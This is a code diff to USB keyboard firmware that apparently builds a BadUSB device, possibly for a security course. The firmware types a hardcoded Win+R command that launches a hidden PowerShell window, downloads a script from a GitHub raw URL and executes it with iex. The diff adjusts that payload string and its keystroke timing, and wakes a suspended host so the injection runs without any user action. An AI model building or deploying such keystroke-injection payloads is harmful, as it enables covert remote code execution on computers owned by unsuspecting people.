@@ -53,6 +53,8 @@ static uint32_t blink_interval_ms = BLINK_NOT_MOUNTED;
 void led_blinking_task(void);
 void hid_task(void);
 
+static bool capslock = false;
+
 /*------------- MAIN -------------*/
 int main(void)
 {
@@ -102,8 +104,8 @@ void tud_resume_cb(void)
 //--------------------------------------------------------------------+
 // USB HID
 //--------------------------------------------------------------------+
-const char* inputs = "r~powershel~l -w h iwr 'ht~tps:/~/raw.githubusercontent.com/map32/cybersecurity-badusb/main/hey.ps1' | iex\n";
-const int inputs_len = 108;
+const char* inputs = "~r~powershel~l -w h iwr 'ht~tps:/~/raw.githubusercontent.com/map32/cybersecurity-badusb/main/hey.ps1' | iex\n";
+const int inputs_len = 109;
 uint8_t char_to_hid_code (uint8_t c) {
   if (c >= 'A' && c <= 'Z') return c - 'A' + HID_KEY_A;
   else if (c >= 'a' && c <= 'z') return c - 'a' + HID_KEY_A;
@@ -126,75 +128,50 @@ uint8_t char_to_hid_code (uint8_t c) {
   return HID_KEY_NONE; //error check
 }
 uint32_t interval_ms = 10;
-static void send_hid_report(uint8_t report_id, uint32_t btn)
+static void send_hid_report()
 {
 
   static bool first = true;
   static int counter = 0;
   // skip if hid is not ready yet
   if ( !tud_hid_ready() ) return;
-  switch(report_id)
-  {
-    case REPORT_ID_KEYBOARD:
-    {
-      // use to avoid send multiple consecutive zero report for keyboard
-      static bool has_keyboard_key = false;
-      static bool key_already_pressed = false;
-      uint8_t keycode[6] = { 0 };
-      uint8_t modifier_bits = 0;
-      if (first) {
-        modifier_bits = 1 << 3; //Left Windows key
-        first = false;
-        interval_ms = 200;
-      }
-      if (counter < inputs_len){
-        keycode[0] = char_to_hid_code(inputs[counter]);
-        if (inputs[counter] == '\r'){
-          interval_ms = 250;
-        } else if (inputs[counter] == '~') {
-          interval_ms = 10;
-        }
-        if (inputs[counter] == '$' || inputs[counter] == '^' || inputs[counter] == '&' ||inputs[counter] == '>' || inputs[counter] == ':' || inputs[counter] == '(' || inputs[counter] == ')' || inputs[counter] == '\"' || inputs[counter] == '|') modifier_bits = 1 << 1;
-      }
-      tud_hid_keyboard_report(REPORT_ID_KEYBOARD, modifier_bits, keycode);
-      /**has_keyboard_key = true;
-      key_already_pressed = !key_already_pressed;
-      {
-        // send empty key report if previously has key pressed
-        if (has_keyboard_key) tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, NULL);
-        key_already_pressed=false;
-        has_keyboard_key = false;
-      }**/
-    }
-    counter++;
-    break;
 
-    default: break;
-  }
+    uint8_t keycode[6] = { 0 };
+    uint8_t modifier_bits = 0;
+    if (first) {
+      first = false;
+      interval_ms = 700;
+    } else if (counter == 1) {
+      modifier_bits = 1 << 3; //Left Windows key
+      interval_ms = 700;
+    }
+    if (counter < inputs_len){
+      keycode[0] = char_to_hid_code(inputs[counter]);
+      if (inputs[counter] == '\r'){
+        interval_ms = 250;
+      } else if (inputs[counter] == '~') {
+        interval_ms = 10;
+      }
+      if (inputs[counter] == '$' || inputs[counter] == '^' || inputs[counter] == '&' ||inputs[counter] == '>' || inputs[counter] == ':' || inputs[counter] == '(' || inputs[counter] == ')' || inputs[counter] == '\"' || inputs[counter] == '|') modifier_bits = 1 << 1;
+    }
+    tud_hid_keyboard_report(0, modifier_bits, keycode);
+    
+    counter++;
 }
 
 // Every 10ms, we will sent 1 report for each HID profile (keyboard, mouse etc ..)
 // tud_hid_report_complete_cb() is used to send the next report after previous one is complete
 void hid_task(void)
 {
-  // Poll every 10ms
   static uint32_t start_ms = 0;
 
   if ( board_millis() - start_ms < interval_ms) return; // not enough time
   start_ms += interval_ms;
-
-  uint32_t const btn = board_button_read();
-
-  // Remote wakeup
-  if ( tud_suspended() && btn )
-  {
-    // Wake up host if we are in suspend mode
-    // and REMOTE_WAKEUP feature is enabled by host
+  if (tud_suspended()) {
     tud_remote_wakeup();
-  }else
-  {
-    // Send the 1st of report chain, the rest will be sent by tud_hid_report_complete_cb()
-    send_hid_report(REPORT_ID_KEYBOARD, btn);
+  } else {
+  // Send the 1st of report chain, the rest will be sent by tud_hid_report_complete_cb()
+    send_hid_report();
   }
 }
 
@@ -228,9 +205,6 @@ void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_
 
   if (report_type == HID_REPORT_TYPE_OUTPUT)
   {
-    // Set keyboard LED e.g Capslock, Numlock etc...
-    if (report_id == REPORT_ID_KEYBOARD)
-    {
       // bufsize should be (at least) 1
       if ( bufsize < 1 ) return;
 
@@ -241,13 +215,14 @@ void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_
         // Capslock On: disable blink, turn led on
         blink_interval_ms = 0;
         board_led_write(true);
+        capslock=true;
       }else
       {
         // Caplocks Off: back to normal blink
+        capslock=false;
         board_led_write(false);
         blink_interval_ms = BLINK_MOUNTED;
       }
-    }
   }
 }
 
